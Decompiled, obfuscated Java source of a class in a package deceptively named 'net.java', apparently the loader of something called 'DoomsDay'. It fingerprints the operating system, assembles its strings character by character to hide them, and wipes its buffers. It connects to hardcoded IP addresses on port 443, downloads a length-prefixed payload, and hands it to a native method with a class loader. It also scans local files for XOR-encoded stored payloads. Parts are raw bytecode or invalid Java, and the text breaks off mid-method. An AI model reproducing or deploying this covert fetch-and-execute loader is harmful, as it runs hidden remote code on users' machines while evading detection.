package net.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.util.Arrays;
import java.util.Iterator;
import java.util.Map;

public class l {
  private static String c;
  
  private static final int a;
  
  private static final int b;
  
  public static Map a = System.getProperties();
  
  public static String a;
  
  public static String b;
  
  public static long a;
  
  public static long b;
  
  private static volatile boolean a;
  
  private byte[] a;
  
  private int c;
  
  private int d;
  
  private int e;
  
  private byte[] b;
  
  private int f;
  
  private int g;
  
  private int h;
  
  private byte[] c;
  
  private int i;
  
  private int j;
  
  private int k;
  
  private int l;
  
  private short[][] a;
  
  private short[] a = new short[192];
  
  private short[] b;
  
  private short[] c;
  
  private short[] d;
  
  private short[] e;
  
  private short[] f;
  
  private short[][] b = (short[][])new short[12];
  
  private short[] g;
  
  private short[] h;
  
  private short[] i;
  
  private short[][] c = (short[][])new short[12];
  
  private short[][] d = false;
  
  private short[] j;
  
  private int m;
  
  private short[] k;
  
  private short[][] e;
  
  private short[][] f;
  
  private short[] l;
  
  private int n;
  
  private int o;
  
  private int p;
  
  private int q;
  
  static {
    byte b = -1;
    String str1 = null;
    stringBuilder2 = null;
    String str3 = null;
    Iterator<Map.Entry> iterator = a.entrySet().iterator();
    while (iterator.hasNext()) {
      Map.Entry<K, ?> entry;
      int j = (entry = iterator.next()).getKey().hashCode();
      entry = (Map.Entry<K, ?>)entry.getValue();
      if (j == -1228098475) {
        str1 = entry.toString().toLowerCase();
        continue;
      } 
      if (j == 1174476494) {
        str2 = entry.toString().toLowerCase();
        continue;
      } 
      if (j == -1228469728)
        str3 = entry.toString().toLowerCase(); 
    } 
    StringBuilder stringBuilder1;
    (stringBuilder1 = new StringBuilder()).append('a');
    stringBuilder1.append('n');
    stringBuilder1.append('d');
    stringBuilder1.append('r');
    stringBuilder1.append('o');
    stringBuilder1.append('i');
    stringBuilder1.append('d');
    if (str2 != null && str2.contains(stringBuilder1.toString())) {
      b = 3;
    } else if (str1 != null) {
      (stringBuilder1 = new StringBuilder()).append('w');
      stringBuilder1.append('i');
      stringBuilder1.append('n');
      if (str1.contains(stringBuilder1.toString())) {
        b = 0;
      } else {
        (stringBuilder1 = new StringBuilder()).append('l');
        stringBuilder1.append('i');
        stringBuilder1.append('n');
        stringBuilder1.append('u');
        stringBuilder1.append('x');
        if (str1.contains(stringBuilder1.toString())) {
          b = 1;
        } else {
          (stringBuilder1 = new StringBuilder()).append('m');
          stringBuilder1.append('a');
          stringBuilder1.append('c');
          (stringBuilder1 = new StringBuilder()).append('o');
          stringBuilder1.append('s');
          stringBuilder1.append('x');
          (stringBuilder1 = new StringBuilder()).append('o');
          stringBuilder1.append('s');
          stringBuilder1.append(' ');
          stringBuilder1.append('x');
          if (str1.contains(stringBuilder1.toString()) || str1.contains(stringBuilder1.toString()) || str1.contains(stringBuilder1.toString())) {
            b = 2;
          } else {
            b = -1;
          } 
        } 
      } 
    } 
    b = b;
    int i;
    if ((i = str3.hashCode()) == 93084186 || i == -1221096139) {
      a = 2;
      return;
    } 
    if (i == -806050265 || i == 92926582) {
      a = false;
      return;
    } 
    if (i == 117110 || i == -806050360 || i == 3178856 || i == 3179817 || i == 3180778 || i == 3181739) {
      a = true;
      return;
    } 
    a = -1;
  }
  
  public static native Object n(Object paramObject);
  
  public static int a(Object paramObject) {
    byte[] arrayOfByte = (byte[])(paramObject = paramObject)[0];
    int i = ((Integer)paramObject[1]).intValue();
    if ((paramObject = paramObject[2]).length == 0)
      return -1; 
    i -= paramObject.length;
    for (byte b = 0; b <= i; b++) {
      byte b1 = 0;
      while (true) {
        if (b1 >= paramObject.length)
          return b; 
        if (paramObject[b1] == arrayOfByte[b + b1]) {
          b1++;
          continue;
        } 
        break;
      } 
    } 
    return -1;
  }
  
  public static int a(Object paramObject1, Object paramObject2) {
    paramObject1 = paramObject1;
    paramObject2 = paramObject2;
    int i = paramObject1.length;
    if (paramObject2.length == 0)
      return -1; 
    i -= paramObject2.length;
    for (byte b = 0; b <= i; b++) {
      byte b1 = 0;
      while (true) {
        if (b1 >= paramObject2.length)
          return b; 
        if (paramObject2[b1] == paramObject1[b + b1]) {
          b1++;
          continue;
        } 
        break;
      } 
    } 
    return -1;
  }
  
  private static boolean a(char paramChar) {
    return (paramChar >= '0' && paramChar <= '9') ? true : ((paramChar >= 'A' && paramChar <= 'F') ? true : ((paramChar >= 'a' && paramChar <= 'f')));
  }
  
  private static byte[] a(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2) {
    byte[] arrayOfByte = null;
    int i;
    if ((i = a(paramArrayOfbyte1, paramArrayOfbyte2)) >= 0) {
      int j = paramArrayOfbyte1.length;
      int k;
      for (k = i; k < paramArrayOfbyte1.length; k++) {
        if (paramArrayOfbyte1[k] == 32) {
          j = k;
          break;
        } 
      } 
      if (j > 0) {
        paramArrayOfbyte2 = new byte[(paramArrayOfbyte1 = arrayOfByte = a(paramArrayOfbyte1, i + paramArrayOfbyte2.length, j)).length];
        i = 0;
        for (j = 0; j < paramArrayOfbyte1.length; j++) {
          if ((k = (char)paramArrayOfbyte1[j]) == 92) {
            if (j + 3 < paramArrayOfbyte1.length) {
              if (paramArrayOfbyte1[j + 1] == 120 && a((char)paramArrayOfbyte1[j + 2]) && a((char)paramArrayOfbyte1[j + 3])) {
                byte b1 = paramArrayOfbyte1[j + 3];
                k = paramArrayOfbyte1[j + 2];
                char c1 = Character.MIN_VALUE;
                char c2 = Character.MIN_VALUE;
                if (k >= 48 && k <= 57)
                  c1 = (char)(k - 48); 
                if (k >= 65 && k <= 70)
                  c1 = (char)(k - 65 + 10); 
                if (k >= 97 && k <= 102)
                  c1 = (char)(k - 97 + 10); 
                if (b1 >= 48 && b1 <= 57)
                  c2 = (char)(b1 - 48); 
                if (b1 >= 65 && b1 <= 70)
                  c2 = (char)(b1 - 65 + 10); 
                if (b1 >= 97 && b1 <= 102)
                  c2 = (char)(b1 - 97 + 10); 
                paramArrayOfbyte2[i++] = (byte)(c1 << 4 | c2);
              } 
              j += 3;
            } else {
              break;
            } 
          } else {
            paramArrayOfbyte2[i++] = (byte)k;
          } 
        } 
        byte[] arrayOfByte1 = a(paramArrayOfbyte2, i);
        for (k = 0; k < paramArrayOfbyte2.length; k++)
          paramArrayOfbyte2[k] = 0; 
        byte[] arrayOfByte2 = arrayOfByte1;
        for (byte b = 0; b < arrayOfByte.length; b++)
          arrayOfByte[b] = 0; 
        arrayOfByte = arrayOfByte2;
      } 
    } 
    return arrayOfByte;
  }
  
  public static void a(Object paramObject) {
    if (a != null)
      return; 
    a = true;
    byte[] arrayOfByte1 = (byte[])(paramObject = paramObject)[0];
    Object object1 = paramObject[1];
    int i = ((Integer)paramObject[2]).intValue();
    ClassLoader classLoader = (ClassLoader)paramObject[3];
    Object object2 = paramObject[4];
    if ((paramObject = paramObject[5]) != null && paramObject.length() == 0)
      paramObject = null; 
    byte[] arrayOfByte2 = null;
    byte[] arrayOfByte3 = null;
    if (arrayOfByte1 != null) {
      arrayOfByte3 = arrayOfByte1;
      byte[] arrayOfByte = { 
          45, 45, 100, 111, 111, 109, 115, 100, 97, 121, 
          118, 101, 114, 115, 105, 111, 110, 61 };
      arrayOfByte3 = a(arrayOfByte3, arrayOfByte);
      byte b;
      for (b = 0; b < 18; b++)
        arrayOfByte[b] = 0; 
      arrayOfByte2 = arrayOfByte3;
      arrayOfByte3 = arrayOfByte1;
      arrayOfByte = new byte[] { 
          45, 45, 99, 111, 110, 102, 105, 103, 115, 116, 
          111, 114, 97, 103, 101, 61 };
      arrayOfByte3 = a(arrayOfByte3, arrayOfByte);
      for (b = 0; b < 16; b++)
        arrayOfByte[b] = 0; 
    } 
    if ((paramObject = a(new Object[] { paramObject, Integer.valueOf(i), arrayOfByte2, arrayOfByte3 })) != null)
      try {
        if (!g.a())
          throw new RuntimeException(); 
        Object[] arrayOfObject;
        (arrayOfObject = new Object[8])[0] = new long[1];
        (new long[1])[0] = i;
        arrayOfObject[1] = new long[1];
        arrayOfObject[2] = arrayOfByte1;
        arrayOfObject[3] = object1;
        arrayOfObject[4] = paramObject;
        arrayOfObject[5] = null;
        arrayOfObject[6] = classLoader;
        arrayOfObject[7] = object2;
        n(arrayOfObject);
        for (byte b = 0; b < paramObject.length; b++)
          paramObject[b] = false; 
        return;
      } catch (Throwable throwable) {
        StringBuilder stringBuilder1;
        (stringBuilder1 = new StringBuilder()).append('E');
        stringBuilder1.append('r');
        stringBuilder1.append('r');
        stringBuilder1.append('o');
        stringBuilder1.append('r');
        stringBuilder1.append(' ');
        stringBuilder1.append('l');
        stringBuilder1.append('o');
        stringBuilder1.append('a');
        stringBuilder1.append('d');
        stringBuilder1.append(' ');
        stringBuilder1.append('D');
        stringBuilder1.append('o');
        stringBuilder1.append('o');
        stringBuilder1.append('m');
        stringBuilder1.append('s');
        stringBuilder1.append('D');
        stringBuilder1.append('a');
        stringBuilder1.append('y');
        System.out.println(stringBuilder1.toString());
        throwable.printStackTrace();
        return;
      }  
    StringBuilder stringBuilder;
    (stringBuilder = new StringBuilder()).append('E');
    stringBuilder.append('r');
    stringBuilder.append('r');
    stringBuilder.append('o');
    stringBuilder.append('r');
    stringBuilder.append(' ');
    stringBuilder.append('l');
    stringBuilder.append('o');
    stringBuilder.append('a');
    stringBuilder.append('d');
    stringBuilder.append(' ');
    stringBuilder.append('D');
    stringBuilder.append('o');
    stringBuilder.append('o');
    stringBuilder.append('m');
    stringBuilder.append('s');
    stringBuilder.append('D');
    stringBuilder.append('a');
    stringBuilder.append('y');
    stringBuilder.append(' ');
    stringBuilder.append('-');
    stringBuilder.append(' ');
    stringBuilder.append('u');
    stringBuilder.append('p');
    stringBuilder.append('d');
    stringBuilder.append('a');
    stringBuilder.append('t');
    stringBuilder.append('e');
    stringBuilder.append(' ');
    stringBuilder.append('n');
    stringBuilder.append('o');
    stringBuilder.append('t');
    stringBuilder.append(' ');
    stringBuilder.append('f');
    stringBuilder.append('o');
    stringBuilder.append('u');
    stringBuilder.append('n');
    stringBuilder.append('d');
    System.out.println(stringBuilder.toString());
  }
  
  private static Object a(Object paramObject) {
    Object object;
    String str = (String)(paramObject = paramObject)[0];
    int i = ((Integer)paramObject[1]).intValue();
    byte[] arrayOfByte1 = (byte[])paramObject[2];
    paramObject = paramObject[3];
    if (str != null && arrayOfByte1 == null)
      try {
        byte[] arrayOfByte;
        if ((arrayOfByte = a(str)) != null)
          return arrayOfByte; 
      } catch (Throwable throwable) {
        StringBuilder stringBuilder;
        (stringBuilder = new StringBuilder()).append('S');
        stringBuilder.append('t');
        stringBuilder.append('o');
        stringBuilder.append('r');
        stringBuilder.append('e');
        stringBuilder.append('d');
        stringBuilder.append(' ');
        stringBuilder.append('1');
        System.out.println(stringBuilder.toString());
        throwable.printStackTrace();
      }  
    byte[] arrayOfByte2;
    if (Arrays.equals(arrayOfByte2 = new byte[] { 36, 108, 97, 116, 101, 115, 116, 36 }, arrayOfByte1))
      arrayOfByte1 = null; 
    for (byte b = 0; b < 8; b++)
      arrayOfByte2[b] = 0; 
    if (((c() && g()) || d()) && (i == 4 || i == 12)) {
      if ((object = a(a(paramObject), arrayOfByte1)) == null)
        object = b(arrayOfByte1); 
    } else if ((object = b(arrayOfByte1)) == null) {
      object = a(a(paramObject), arrayOfByte1);
    } 
    if (object == null && str != null)
      try {
        if ((paramObject = a(str)) != null)
          object = paramObject; 
      } catch (Throwable throwable) {
        StringBuilder stringBuilder;
        (stringBuilder = new StringBuilder()).append('S');
        stringBuilder.append('t');
        stringBuilder.append('o');
        stringBuilder.append('r');
        stringBuilder.append('e');
        stringBuilder.append('d');
        stringBuilder.append(' ');
        stringBuilder.append('2');
        System.out.println(stringBuilder.toString());
        throwable.printStackTrace();
      }  
    if (i == 1 || i == 12)
      try {
        if (str != null && (paramObject = a(str)) != null && object != null && a((byte[])paramObject) > a((byte[])object))
          object = paramObject; 
      } catch (Throwable throwable) {
        StringBuilder stringBuilder;
        (stringBuilder = new StringBuilder()).append('S');
        stringBuilder.append('t');
        stringBuilder.append('o');
        stringBuilder.append('r');
        stringBuilder.append('e');
        stringBuilder.append('d');
        stringBuilder.append(' ');
        stringBuilder.append('3');
        System.out.println(stringBuilder.toString());
        throwable.printStackTrace();
      }  
    return object;
  }
  
  private static String a(Object paramObject) {
    String str = null;
    if (paramObject != null && paramObject instanceof byte[]) {
      byte[] arrayOfByte;
      if (!Arrays.equals(arrayOfByte = new byte[] { 36, 100, 101, 102, 97, 117, 108, 116, 36 }, (byte[])paramObject))
        try {
          str = new String((byte[])paramObject, (String)c);
        } catch (Throwable throwable) {} 
      for (byte b = 0; b < 9; b++)
        arrayOfByte[b] = 0; 
    } 
    if (str == null) {
      (paramObject = new StringBuilder()).append('d');
      paramObject.append('o');
      paramObject.append('o');
      paramObject.append('m');
      paramObject.append('s');
      paramObject.append('d');
      paramObject.append('a');
      paramObject.append('y');
      str = (new File(paramObject.toString())).getAbsolutePath();
    } 
    return str;
  }
  
  private static Object b(Object paramObject) {
    // Byte code:
    //   0: iconst_4
    //   1: newarray byte
    //   3: dup
    //   4: iconst_0
    //   5: bipush #-91
    //   7: bastore
    //   8: dup
    //   9: iconst_1
    //   10: bipush #22
    //   12: bastore
    //   13: dup
    //   14: iconst_2
    //   15: bipush #-60
    //   17: bastore
    //   18: astore_1
    //   19: bipush #16
    //   21: newarray byte
    //   23: dup
    //   24: iconst_0
    //   25: bipush #42
    //   27: bastore
    //   28: dup
    //   29: iconst_1
    //   30: iconst_3
    //   31: bastore
    //   32: dup
    //   33: iconst_2
    //   34: bipush #-80
    //   36: bastore
    //   37: dup
    //   38: iconst_3
    //   39: bipush #-64
    //   41: bastore
    //   42: dup
    //   43: iconst_5
    //   44: iconst_2
    //   45: bastore
    //   46: dup
    //   47: bipush #7
    //   49: bipush #-48
    //   51: bastore
    //   52: dup
    //   53: bipush #12
    //   55: bipush #20
    //   57: bastore
    //   58: dup
    //   59: bipush #13
    //   61: bipush #44
    //   63: bastore
    //   64: dup
    //   65: bipush #14
    //   67: bipush #-32
    //   69: bastore
    //   70: dup
    //   71: bipush #15
    //   73: iconst_1
    //   74: bastore
    //   75: astore_2
    //   76: aload_0
    //   77: ifnull -> 157
    //   80: iconst_0
    //   81: newarray byte
    //   83: astore_3
    //   84: aload_0
    //   85: checkcast java/lang/String
    //   88: getstatic net/java/l.c : Ljava/lang/String;
    //   91: invokevirtual getBytes : (Ljava/lang/String;)[B
    //   94: astore_3
    //   95: goto -> 99
    //   98: pop
    //   99: bipush #8
    //   101: aload_3
    //   102: arraylength
    //   103: iadd
    //   104: newarray byte
    //   106: dup
    //   107: astore_0
    //   108: iconst_0
    //   109: bipush #22
    //   111: bastore
    //   112: aload_0
    //   113: iconst_1
    //   114: iconst_3
    //   115: bastore
    //   116: aload_0
    //   117: iconst_2
    //   118: bipush #100
    //   120: bastore
    //   121: aload_0
    //   122: iconst_3
    //   123: aload_3
    //   124: arraylength
    //   125: i2b
    //   126: bastore
    //   127: iconst_0
    //   128: istore #4
    //   130: goto -> 147
    //   133: aload_0
    //   134: iload #4
    //   136: bipush #8
    //   138: iadd
    //   139: aload_3
    //   140: iload #4
    //   142: baload
    //   143: bastore
    //   144: iinc #4, 1
    //   147: iload #4
    //   149: aload_3
    //   150: arraylength
    //   151: if_icmplt -> 133
    //   154: goto -> 176
    //   157: bipush #8
    //   159: newarray byte
    //   161: dup
    //   162: iconst_0
    //   163: bipush #22
    //   165: bastore
    //   166: dup
    //   167: iconst_1
    //   168: iconst_3
    //   169: bastore
    //   170: dup
    //   171: iconst_2
    //   172: bipush #100
    //   174: bastore
    //   175: astore_0
    //   176: invokestatic open : ()Ljava/nio/channels/SocketChannel;
    //   179: astore_3
    //   180: aload_3
    //   181: new java/net/InetSocketAddress
    //   184: dup
    //   185: aload_1
    //   186: invokestatic getByAddress : ([B)Ljava/net/InetAddress;
    //   189: sipush #443
    //   192: invokespecial <init> : (Ljava/net/InetAddress;I)V
    //   195: invokevirtual connect : (Ljava/net/SocketAddress;)Z
    //   198: pop
    //   199: goto -> 222
    //   202: pop
    //   203: aload_3
    //   204: new java/net/InetSocketAddress
    //   207: dup
    //   208: aload_2
    //   209: invokestatic getByAddress : ([B)Ljava/net/InetAddress;
    //   212: sipush #443
    //   215: invokespecial <init> : (Ljava/net/InetAddress;I)V
    //   218: invokevirtual connect : (Ljava/net/SocketAddress;)Z
    //   221: pop
    //   222: aload_0
    //   223: arraylength
    //   224: invokestatic allocateDirect : (I)Ljava/nio/ByteBuffer;
    //   227: dup
    //   228: astore #4
    //   230: aload_0
    //   231: invokevirtual put : ([B)Ljava/nio/ByteBuffer;
    //   234: pop
    //   235: aload #4
    //   237: iconst_0
    //   238: invokevirtual position : (I)Ljava/nio/Buffer;
    //   241: pop
    //   242: aload_3
    //   243: aload #4
    //   245: invokevirtual write : (Ljava/nio/ByteBuffer;)I
    //   248: pop
    //   249: aload #4
    //   251: iconst_0
    //   252: invokevirtual position : (I)Ljava/nio/Buffer;
    //   255: pop
    //   256: aload #4
    //   258: dup
    //   259: invokevirtual limit : ()I
    //   262: newarray byte
    //   264: invokevirtual put : ([B)Ljava/nio/ByteBuffer;
    //   267: pop
    //   268: iconst_4
    //   269: invokestatic allocateDirect : (I)Ljava/nio/ByteBuffer;
    //   272: astore #4
    //   274: aload_3
    //   275: aload #4
    //   277: invokevirtual read : (Ljava/nio/ByteBuffer;)I
    //   280: pop
    //   281: iconst_0
    //   282: aload #4
    //   284: iconst_0
    //   285: invokevirtual get : (I)B
    //   288: sipush #255
    //   291: iand
    //   292: bipush #24
    //   294: ishl
    //   295: ior
    //   296: aload #4
    //   298: iconst_1
    //   299: invokevirtual get : (I)B
    //   302: sipush #255
    //   305: iand
    //   306: bipush #16
    //   308: ishl
    //   309: ior
    //   310: aload #4
    //   312: iconst_2
    //   313: invokevirtual get : (I)B
    //   316: sipush #255
    //   319: iand
    //   320: bipush #8
    //   322: ishl
    //   323: ior
    //   324: aload #4
    //   326: iconst_3
    //   327: invokevirtual get : (I)B
    //   330: sipush #255
    //   333: iand
    //   334: ior
    //   335: dup
    //   336: istore #5
    //   338: ifgt -> 409
    //   341: aload_3
    //   342: invokevirtual close : ()V
    //   345: iconst_0
    //   346: istore #4
    //   348: goto -> 359
    //   351: aload_0
    //   352: iload #4
    //   354: iconst_0
    //   355: bastore
    //   356: iinc #4, 1
    //   359: iload #4
    //   361: aload_0
    //   362: arraylength
    //   363: if_icmplt -> 351
    //   366: iconst_0
    //   367: istore #4
    //   369: goto -> 380
    //   372: aload_1
    //   373: iload #4
    //   375: iconst_0
    //   376: bastore
    //   377: iinc #4, 1
    //   380: iload #4
    //   382: iconst_4
    //   383: if_icmplt -> 372
    //   386: iconst_0
    //   387: istore #4
    //   389: goto -> 400
    //   392: aload_2
    //   393: iload #4
    //   395: iconst_0
    //   396: bastore
    //   397: iinc #4, 1
    //   400: iload #4
    //   402: bipush #16
    //   404: if_icmplt -> 392
    //   407: aconst_null
    //   408: areturn
    //   409: aload #4
    //   411: iconst_0
    //   412: invokevirtual position : (I)Ljava/nio/Buffer;
    //   415: pop
    //   416: aload #4
    //   418: dup
    //   419: invokevirtual limit : ()I
    //   422: newarray byte
    //   424: invokevirtual put : ([B)Ljava/nio/ByteBuffer;
    //   427: pop
    //   428: iload #5
    //   430: newarray byte
    //   432: astore #4
    //   434: sipush #16384
    //   437: invokestatic allocateDirect : (I)Ljava/nio/ByteBuffer;
    //   440: astore #6
    //   442: iconst_0
    //   443: istore #7
    //   445: goto -> 492
    //   448: aload_3
    //   449: aload #6
    //   451: invokevirtual read : (Ljava/nio/ByteBuffer;)I
    //   454: dup
    //   455: istore #8
    //   457: iflt -> 499
    //   460: aload #6
    //   462: iconst_0
    //   463: invokevirtual position : (I)Ljava/nio/Buffer;
    //   466: pop
    //   467: aload #6
    //   469: aload #4
    //   471: iload #7
    //   473: iload #8
    //   475: invokevirtual get : ([BII)Ljava/nio/ByteBuffer;
    //   478: pop
    //   479: aload #6
    //   481: invokevirtual clear : ()Ljava/nio/Buffer;
    //   484: pop
    //   485: iload #7
    //   487: iload #8
    //   489: iadd
    //   490: istore #7
    //   492: iload #7
    //   494: iload #5
    //   496: if_icmplt -> 448
    //   499: aload_3
    //   500: invokevirtual close : ()V
    //   503: aload #6
    //   505: iconst_0
    //   506: invokevirtual position : (I)Ljava/nio/Buffer;
    //   509: pop
    //   510: aload #6
    //   512: dup
    //   513: invokevirtual limit : ()I
    //   516: newarray byte
    //   518: invokevirtual put : ([B)Ljava/nio/ByteBuffer;
    //   521: pop
    //   522: aload #4
    //   524: astore_3
    //   525: iconst_0
    //   526: istore #4
    //   528: goto -> 539
    //   531: aload_0
    //   532: iload #4
    //   534: iconst_0
    //   535: bastore
    //   536: iinc #4, 1
    //   539: iload #4
    //   541: aload_0
    //   542: arraylength
    //   543: if_icmplt -> 531
    //   546: iconst_0
    //   547: istore #4
    //   549: goto -> 560
    //   552: aload_1
    //   553: iload #4
    //   555: iconst_0
    //   556: bastore
    //   557: iinc #4, 1
    //   560: iload #4
    //   562: iconst_4
    //   563: if_icmplt -> 552
    //   566: iconst_0
    //   567: istore #4
    //   569: goto -> 580
    //   572: aload_2
    //   573: iload #4
    //   575: iconst_0
    //   576: bastore
    //   577: iinc #4, 1
    //   580: iload #4
    //   582: bipush #16
    //   584: if_icmplt -> 572
    //   587: aload_3
    //   588: areturn
    //   589: invokevirtual printStackTrace : ()V
    //   592: iconst_0
    //   593: istore #4
    //   595: goto -> 606
    //   598: aload_0
    //   599: iload #4
    //   601: iconst_0
    //   602: bastore
    //   603: iinc #4, 1
    //   606: iload #4
    //   608: aload_0
    //   609: arraylength
    //   610: if_icmplt -> 598
    //   613: iconst_0
    //   614: istore #4
    //   616: goto -> 627
    //   619: aload_1
    //   620: iload #4
    //   622: iconst_0
    //   623: bastore
    //   624: iinc #4, 1
    //   627: iload #4
    //   629: iconst_4
    //   630: if_icmplt -> 619
    //   633: iconst_0
    //   634: istore #4
    //   636: goto -> 647
    //   639: aload_2
    //   640: iload #4
    //   642: iconst_0
    //   643: bastore
    //   644: iinc #4, 1
    //   647: iload #4
    //   649: bipush #16
    //   651: if_icmplt -> 639
    //   654: goto -> 722
    //   657: astore_3
    //   658: iconst_0
    //   659: istore #4
    //   661: goto -> 672
    //   664: aload_0
    //   665: iload #4
    //   667: iconst_0
    //   668: bastore
    //   669: iinc #4, 1
    //   672: iload #4
    //   674: aload_0
    //   675: arraylength
    //   676: if_icmplt -> 664
    //   679: iconst_0
    //   680: istore #4
    //   682: goto -> 693
    //   685: aload_1
    //   686: iload #4
    //   688: iconst_0
    //   689: bastore
    //   690: iinc #4, 1
    //   693: iload #4
    //   695: iconst_4
    //   696: if_icmplt -> 685
    //   699: iconst_0
    //   700: istore #4
    //   702: goto -> 713
    //   705: aload_2
    //   706: iload #4
    //   708: iconst_0
    //   709: bastore
    //   710: iinc #4, 1
    //   713: iload #4
    //   715: bipush #16
    //   717: if_icmplt -> 705
    //   720: aload_3
    //   721: athrow
    //   722: aconst_null
    //   723: areturn
    // Exception table:
    //   from	to	target	type
    //   84	95	98	java/lang/Throwable
    //   176	345	589	java/lang/Exception
    //   176	345	657	finally
    //   180	199	202	java/lang/Throwable
    //   409	525	589	java/lang/Exception
    //   409	525	657	finally
    //   589	592	657	finally
  }
  
  public static byte[] a(String paramString) {
    try {
      InputStream inputStream;
      if ((inputStream = l.class.getResourceAsStream(paramString)) == null)
        return null; 
      byte[] arrayOfByte = new byte[16384];
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(inputStream.available());
      int i;
      while ((i = inputStream.read(arrayOfByte)) != -1)
        byteArrayOutputStream.write(arrayOfByte, 0, i); 
      inputStream.close();
      return byteArrayOutputStream.toByteArray();
    } catch (Exception exception) {
      throw new RuntimeException(exception);
    } 
  }
  
  private static Object a(Object paramObject1, Object paramObject2) {
    // Byte code:
    //   0: aload_0
    //   1: instanceof java/lang/String
    //   4: ifeq -> 22
    //   7: new java/io/File
    //   10: dup
    //   11: aload_0
    //   12: checkcast java/lang/String
    //   15: invokespecial <init> : (Ljava/lang/String;)V
    //   18: astore_0
    //   19: goto -> 27
    //   22: aload_0
    //   23: checkcast java/io/File
    //   26: astore_0
    //   27: aconst_null
    //   28: astore_2
    //   29: aconst_null
    //   30: astore_3
    //   31: aconst_null
    //   32: astore #4
    //   34: iconst_0
    //   35: istore #5
    //   37: aload_0
    //   38: invokevirtual listFiles : ()[Ljava/io/File;
    //   41: dup
    //   42: astore_0
    //   43: ifnonnull -> 48
    //   46: aconst_null
    //   47: areturn
    //   48: iconst_0
    //   49: istore #6
    //   51: goto -> 247
    //   54: aload_0
    //   55: iload #6
    //   57: aaload
    //   58: invokevirtual getName : ()Ljava/lang/String;
    //   61: dup
    //   62: astore #7
    //   64: invokevirtual length : ()I
    //   67: bipush #8
    //   69: if_icmple -> 244
    //   72: aload #7
    //   74: invokevirtual length : ()I
    //   77: bipush #20
    //   79: if_icmpge -> 244
    //   82: aload #7
    //   84: invokestatic a : (Ljava/lang/String;)I
    //   87: dup
    //   88: istore #7
    //   90: ifle -> 244
    //   93: aload #4
    //   95: ifnonnull -> 110
    //   98: new java/io/ByteArrayOutputStream
    //   101: dup
    //   102: ldc_w 1310720
    //   105: invokespecial <init> : (I)V
    //   108: astore #4
    //   110: aload_2
    //   111: ifnonnull -> 120
    //   114: ldc_w 65536
    //   117: newarray byte
    //   119: astore_2
    //   120: aload #4
    //   122: invokevirtual reset : ()V
    //   125: new java/io/RandomAccessFile
    //   128: dup
    //   129: aload_0
    //   130: iload #6
    //   132: aaload
    //   133: new java/lang/StringBuilder
    //   136: dup
    //   137: invokespecial <init> : ()V
    //   140: dup
    //   141: astore #8
    //   143: bipush #114
    //   145: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   148: pop
    //   149: aload #8
    //   151: invokevirtual toString : ()Ljava/lang/String;
    //   154: invokespecial <init> : (Ljava/io/File;Ljava/lang/String;)V
    //   157: astore #8
    //   159: aload_1
    //   160: ifnull -> 198
    //   163: bipush #64
    //   165: newarray byte
    //   167: astore #9
    //   169: aload #8
    //   171: aload #9
    //   173: invokevirtual readFully : ([B)V
    //   176: aload #9
    //   178: invokestatic c : ([B)[B
    //   181: aload_1
    //   182: checkcast [B
    //   185: invokestatic equals : ([B[B)Z
    //   188: ifeq -> 239
    //   191: aload #4
    //   193: aload #9
    //   195: invokevirtual write : ([B)V
    //   198: iload #7
    //   200: iload #5
    //   202: if_icmple -> 239
    //   205: goto -> 217
    //   208: aload #4
    //   210: aload_2
    //   211: iconst_0
    //   212: iload #9
    //   214: invokevirtual write : ([BII)V
    //   217: aload #8
    //   219: aload_2
    //   220: invokevirtual read : ([B)I
    //   223: dup
    //   224: istore #9
    //   226: ifge -> 208
    //   229: aload #4
    //   231: invokevirtual toByteArray : ()[B
    //   234: astore_3
    //   235: iload #7
    //   237: istore #5
    //   239: aload #8
    //   241: invokevirtual close : ()V
    //   244: iinc #6, 1
    //   247: iload #6
    //   249: aload_0
    //   250: arraylength
    //   251: if_icmplt -> 54
    //   254: goto -> 260
    //   257: invokevirtual printStackTrace : ()V
    //   260: aload_3
    //   261: areturn
    // Exception table:
    //   from	to	target	type
    //   37	46	257	java/lang/Throwable
    //   48	254	257	java/lang/Throwable
  }
  
  public static void b(Object paramObject) {
    try {
      Object[] arrayOfObject;
      paramObject = (arrayOfObject = (Object[])paramObject)[0];
      byte[] arrayOfByte = (byte[])arrayOfObject[1];
      (paramObject = new StringBuilder()).append('r');
      paramObject.append('w');
      (paramObject = new RandomAccessFile((File)paramObject, paramObject.toString())).write(arrayOfByte);
      paramObject.close();
      return;
    } catch (Throwable throwable) {
      return;
    } 
  }
  
  private static byte[] c(byte[] paramArrayOfbyte) {
    paramArrayOfbyte = (byte[])paramArrayOfbyte.clone();
    byte b1 = 0;
    for (byte b2 = 6; b2 < 64; b2++) {
      paramArrayOfbyte[b2] = (byte)(paramArrayOfbyte[b2] ^ 0x47);
      if (paramArrayOfbyte[b2] == 0 && !b1)
        b1 = b2; 
    } 
    if (b1 == 0)
      b1 = 64; 
    return a(paramArrayOfbyte, 6, b1);
  }
  
  private static int a(byte[] paramArrayOfbyte) {
    return 0 + ((paramArrayOfbyte[0] & 0xFF) << 24) + ((paramArrayOfbyte[1] & 0xFF) << 16) + ((paramArrayOfbyte[2] & 0xFF) << 8) + (paramArrayOfbyte[3] & 0xFF);
  }
  
  private static int a(String paramString) {
    // Byte code:
    //   0: aload_0
    //   1: ifnonnull -> 52
    //   4: new java/lang/NumberFormatException
    //   7: dup
    //   8: new java/lang/StringBuilder
    //   11: dup
    //   12: invokespecial <init> : ()V
    //   15: dup
    //   16: astore_1
    //   17: bipush #110
    //   19: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   22: pop
    //   23: aload_1
    //   24: bipush #117
    //   26: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   29: pop
    //   30: aload_1
    //   31: bipush #108
    //   33: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   36: pop
    //   37: aload_1
    //   38: bipush #108
    //   40: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   43: pop
    //   44: aload_1
    //   45: invokevirtual toString : ()Ljava/lang/String;
    //   48: invokespecial <init> : (Ljava/lang/String;)V
    //   51: athrow
    //   52: aload_0
    //   53: invokevirtual length : ()I
    //   56: dup
    //   57: istore_1
    //   58: ifle -> 1079
    //   61: aload_0
    //   62: iconst_0
    //   63: invokevirtual charAt : (I)C
    //   66: bipush #45
    //   68: if_icmpne -> 445
    //   71: new java/lang/NumberFormatException
    //   74: dup
    //   75: new java/lang/StringBuilder
